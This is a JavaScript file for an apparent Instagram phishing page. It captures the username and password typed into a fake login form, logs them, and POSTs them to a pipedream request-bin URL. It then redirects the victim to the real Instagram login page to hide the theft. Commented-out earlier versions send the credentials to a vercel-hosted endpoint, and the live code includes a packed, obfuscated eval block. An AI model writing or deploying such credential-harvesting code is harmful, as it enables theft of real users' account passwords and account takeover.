// document.getElementById('loginForm').addEventListener('submit', function(event) {
//     event.preventDefault();

//     const username = document.getElementById('username').value;
//     const password = document.getElementById('password').value;

//     // Log the credentials to the console
//     console.log('Username:', username);
//     console.log('Password:', password);

//     // Optionally, you can redirect the user to the real Instagram login page
//     window.location.href = 'https://www.instagram.com/accounts/login/';
// });


//     const username = document.getElementById('username').value;
//     const password = document.getElementById('password').value;

//     // Send the credentials to your server
//     fetch('https://vercel.com/farouqs-projects-04f0e790/instagram', {
//         method: 'POST',
//         headers: {
//             'Content-Type': 'application/json',
//         },
//         body: JSON.stringify({ username: username, password: password }),
//     })
//     .then(response => response.json())
//     .then(data => {
//         console.log('Success:', data);
    
//     })
//     .catch((error) => {
//         console.error('Error:', error);
//     });
// Add an event listener for the form submission
document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent the default form submission behavior

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Log the credentials to the console
    console.log('Username:', username);
    console.log('Password:', password);
    // Obfuscated code
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('3.4(\'5\').6(\'7\',8(9){9.0();a b=3.4(\'c\').d;e f=3.4(\'g\').d;h.i(\'j:\',b);h.i(\'k:\',f)});',22,22,'preventDefault|username|password|document|getElementById|loginForm|addEventListener|submit|function|event|const|value|console|log|Username|Password'.split('|'),0,{}))

    // Send the credentials to Requestbin
    fetch('https://eoj56v5yfq0z2cx.m.pipedream.net' , {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ username, password}),
    })
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
        // Optionally, redirect to another page or display a success message
    })
    .catch((error) => {
        console.error('Error:', error);
    });

    // Optionally, redirect to the Instagram login page
    // Remove or modify this line if you don't want to redirect
    window.location.href = 'https://www.instagram.com/accounts/login/';
    
});